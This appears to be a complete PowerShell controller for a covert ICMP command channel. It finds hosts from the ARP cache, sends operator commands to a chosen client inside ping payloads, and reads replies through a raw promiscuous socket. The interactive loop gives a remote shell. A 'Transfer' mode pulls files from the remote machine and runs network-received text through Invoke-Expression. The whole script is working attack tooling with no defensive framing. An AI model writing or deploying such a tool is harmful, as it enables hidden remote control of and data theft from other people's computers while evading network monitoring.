Add-Type -AssemblyName  Microsoft.VisualBasic, PresentationCore, PresentationFramework, System.Drawing, System.Windows.Forms, WindowsBase, WindowsFormsIntegration, System; Add-Type -TypeDefinition 'namespace Windows.Native{using System;using System.ComponentModel;using System.IO;using System.Runtime.InteropServices;public class Kernel32{public const uint FILE_SHARE_READ = 1;public const uint FILE_SHARE_WRITE = 2;public const uint GENERIC_READ = 0x80000000;public const uint GENERIC_WRITE = 0x40000000;public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);public const int STD_ERROR_HANDLE = -12;public const int STD_INPUT_HANDLE = -10;public const int STD_OUTPUT_HANDLE = -11;[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]public class CONSOLE_FONT_INFOEX{private int cbSize;public CONSOLE_FONT_INFOEX(){this.cbSize = Marshal.SizeOf(typeof(CONSOLE_FONT_INFOEX));}public int FontIndex;public short FontWidth;public short FontHeight;public int FontFamily;public int FontWeight;[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]public string FaceName;}public class Handles{public static readonly IntPtr StdIn = GetStdHandle(STD_INPUT_HANDLE);public static readonly IntPtr StdOut = GetStdHandle(STD_OUTPUT_HANDLE);public static readonly IntPtr StdErr = GetStdHandle(STD_ERROR_HANDLE);}[DllImport("kernel32.dll", SetLastError=true)]public static extern bool CloseHandle(IntPtr hHandle);[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPTStr)] string filename,uint access,uint share,IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,uint flagsAndAttributes,IntPtr templateFile);[DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]public static extern bool GetCurrentConsoleFontEx(IntPtr hConsoleOutput, bool bMaximumWindow, [In, Out] CONSOLE_FONT_INFOEX lpConsoleCurrentFont);[DllImport("kernel32.dll", SetLastError=true)]public static extern IntPtr GetStdHandle(int nStdHandle);[DllImport("kernel32.dll", SetLastError=true)]public static extern bool SetCurrentConsoleFontEx(IntPtr ConsoleOutput, bool MaximumWindow,[In, Out] CONSOLE_FONT_INFOEX ConsoleCurrentFontEx);public static IntPtr CreateFile(string fileName, uint fileAccess, uint fileShare, FileMode creationDisposition){IntPtr hFile = CreateFile(fileName, fileAccess, fileShare, IntPtr.Zero, creationDisposition, 0U, IntPtr.Zero);if (hFile == INVALID_HANDLE_VALUE){throw new Win32Exception();}return hFile;}public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx(){IntPtr hFile = IntPtr.Zero;try{hFile = CreateFile("CONOUT$", GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);return GetCurrentConsoleFontEx(hFile);}finally{CloseHandle(hFile);}}public static void SetCurrentConsoleFontEx(CONSOLE_FONT_INFOEX cfi){IntPtr hFile = IntPtr.Zero;try{hFile = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);SetCurrentConsoleFontEx(hFile, false, cfi);}finally{CloseHandle(hFile);}}public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx(IntPtr outputHandle){CONSOLE_FONT_INFOEX cfi = new CONSOLE_FONT_INFOEX();if (!GetCurrentConsoleFontEx(outputHandle, false, cfi)){throw new Win32Exception();}return cfi;}}}'; 
$F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.FontWidth = 6; $F.FontHeight = 12; $F.FontFamily = 54; $F.FontWeight = 1000; $F.FaceName = "SimSun-ExtB"; [Windows.Native.Kernel32]::SetCurrentConsoleFontEx($F)

write-host "CONEX"
#Get-ArpCache
function GAC {
    $regexIPv4Address = '(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
    $regexMACAddress = '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})|([0-9A-Fa-f]{2}){6}'
    arp -a | Foreach-Object { if ($_ -like "*---*") { $interfaceIPv4 = [regex]::Matches($_, $regexIPv4Address).Value } elseif ($_ -match $regexMACAddress) {
            $ipv4Address = $_.Split(" ") | Where-Object { $_ -match $regexIPv4Address }; $macAddress = $_.Split(" ") | Where-Object { $_ -match $regexMACAddress } | ForEach-Object { $_.ToUpper() }
            $type = $_.Split(" ") | Where-Object { ![String]::IsNullOrEmpty($_) -and $_ -notmatch $regexIPv4Address -and $_ -notmatch $regexMACAddress }
            [pscustomobject]@{Interface = $interfaceIPv4; IPv4Address = $ipv4Address; MACAddress = $macAddress; Type = $type }
        }
    }
}

$BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)

(GAC).IPv4Address
$SendingIP = Read-Host "Client ADDRESS"

[char]$EL = 14
$VerbosePreference = "Continue"

$sc = [System.Net.NetworkInformation.Ping]::new()
$PingOptions = [System.Net.NetworkInformation.PingOptions]::new()
$PingOptions.DontFragment = $true
$pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
$pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
$pRs.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
$buffer = new-object byte[] $pRs.ReceiveBufferSize

function ret {
    $FeedBack = ([System.Text.Encoding]::ASCII.GetString($script:buffer[28..$pRs.ReceiveBufferSize]))
    $FeedBack = ($FeedBack.Substring(0, ($FeedBack.IndexOf($script:EL)))) 
    return $FeedBack
}

clear-host
Write-Verbose "#Send Host Ip Packet " #Send Host Ip Packet 
if (($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("H_IP" + $EL)), $PingOptions)).Status -eq "Success") {
    $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($BindingIP + $EL)), $PingOptions) | out-null
    $pRs.Receive($buffer) | out-null; $banner = (ret)
    write-host $banner

    $pRs.Receive($buffer) | out-null
    write-host -nonewline (ret); $inp = $Host.UI.ReadLine()
    if ($inp -eq "cls") {
        clear-host; write-host $banner
        $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null
    }
    elseif ($inp -eq "Transfer") {
        write-host -nonewline "Infile > "; $Infile = ($Host.UI.ReadLine()).Replace('"', '')
        write-host -nonewline "Outfile > "; $Outfile = ($Host.UI.ReadLine()).Replace('"', '')
        
        ($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("Transfer" + $EL)), $PingOptions)) | out-null
        Write-Verbose "Transfer"
        ($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($Infile + $EL)), $PingOptions)) | out-null

        write-host "" | Out-File $Outfile
        $pRs.Receive($buffer) | out-null
        if ((ret) -eq "True") {
            $nexit = $true; $i = 0
            $pos = $host.ui.rawui.cursorposition
            while ( $nexit ) {
                $host.ui.rawui.cursorposition = $pos
                $pRs.Receive($buffer) | out-null
                    (Invoke-Expression -Command (ret))
                $pRs.Receive($buffer) | out-null
                $sc.Send($SendingIP , 60 * 1000, (([text.encoding]::ASCII).GetBytes($EL)), $PingOptions) | out-null
                if ((ret) -eq "End") {
                    $nexit = $false
                    write-host ending
                    break
                }
                else {
                    (ret) >> $Outfile
                }
            }
        }
        elseif ((ret) -eq "False") {
            $pRs.Receive($buffer) | out-null
                (ret) >> $Outfile
        }
        Start-Process $Outfile

    }
    else { $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null }
}

while ($true) {
    $pRs.Receive($buffer) | out-null; 
    $out = (ret);$out.replace("     ","`n")


    $pRs.Receive($buffer) | out-null; write-host -nonewline (ret); $inp = $Host.UI.ReadLine()

    if ($inp -eq "cls") {
        clear-host; write-host $banner
        $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null
    }
    elseif ($inp -eq "Transfer") {
        write-host -nonewline "Infile > "; $Infile = ($Host.UI.ReadLine()).Replace('"', '')
        write-host -nonewline "Outfile > "; $Outfile = ($Host.UI.ReadLine()).Replace('"', '')
        
        ($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("Transfer" + $EL)), $PingOptions)) | out-null
        Write-Verbose "Transfer"
        ($sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($Infile + $EL)), $PingOptions)) | out-null

        write-host "" | Out-File $Outfile
        $pRs.Receive($buffer) | out-null
        if ((ret) -eq "True") {
            $nexit = $true; $i = 0
            $pos = $host.ui.rawui.cursorposition
            while ( $nexit ) {
                $host.ui.rawui.cursorposition = $pos
                $pRs.Receive($buffer) | out-null
                    (Invoke-Expression -Command (ret))
                $pRs.Receive($buffer) | out-null
                $sc.Send($SendingIP , 60 * 1000, (([text.encoding]::ASCII).GetBytes($EL)), $PingOptions) | out-null
                if ((ret) -eq "End") {
                    $nexit = $false
                    write-host ending
                    break
                }
                else {
                    (ret) >> $Outfile
                }
            }
        }
        elseif ((ret) -eq "False") {
            $pRs.Receive($buffer) | out-null
                (ret) >> $Outfile
        }
        Start-Process $Outfile

    }
    else { $sc.Send([ipaddress]$SendingIP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($inp + $EL)), $PingOptions) | out-null }
}